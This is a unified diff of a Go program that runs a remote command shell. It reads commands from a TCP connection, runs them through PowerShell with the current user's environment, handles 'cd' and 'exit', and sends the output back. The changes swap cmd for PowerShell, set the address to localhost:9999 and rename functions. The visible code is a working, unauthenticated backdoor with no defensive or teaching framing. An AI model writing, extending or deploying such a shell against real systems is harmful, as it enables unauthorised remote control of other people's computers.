@@ -4,25 +4,37 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"os/user"
 )
 
 const (
 	PROTOCOL = "tcp"
-	IP_PORT  = "IP:PORT"
+	IP_PORT  = "localhost:9999"
 )
 
-func Cmd(command string) string {
-	output, err := exec.Command("cmd", "/c", command).Output()
+func user_name() string {
+	_user, err := user.Current()
+	if err != nil {
+		return ""
+	}
+	return _user.Username
+}
+
+func command_realise(command string) string {
+	cmd := exec.Command("powershell", command)
+	cmd.Env = os.Environ()
+	cmd.Env = append(cmd.Env, "USER="+user_name())
+	output_from_cmd, err := cmd.Output()
 	if err != nil {
 		return "{-} Command error...\n"
 	}
-	return string(output)
+	return string(output_from_cmd)
 }
 
 func handleClient(conn net.Conn) {
 	defer conn.Close()
 	buffer := make([]byte, 1024)
-	var i = 3
+	var indent = 3
 	for {
 		conn.Write([]byte("{+} Enter command >>> "))
 
@@ -31,16 +43,16 @@ func handleClient(conn net.Conn) {
 		if err != nil {
 			break
 		}
-		if command[0:len(command)-2] == "Exit" {
+		if command[0:len(command)-2] == "exit" {
 			conn.Write(append([]byte("{+} BREAKPOINT\n")))
 			os.Exit(1)
 		}
 		if string(command[0])+string(command[1]) == "cd" {
-			os.Chdir(command[i : len(command)-2])
-			conn.Write(append([]byte(command[i : len(command)-2])))
+			os.Chdir(command[indent : len(command)-2])
+			conn.Write(append([]byte(command[indent : len(command)-2])))
 		} else {
-			var ResultCmd = Cmd(command)
-			conn.Write(append([]byte(ResultCmd)))
+			var command_result = command_realise(command)
+			conn.Write(append([]byte(command_result)))
 		}
 	}
 }
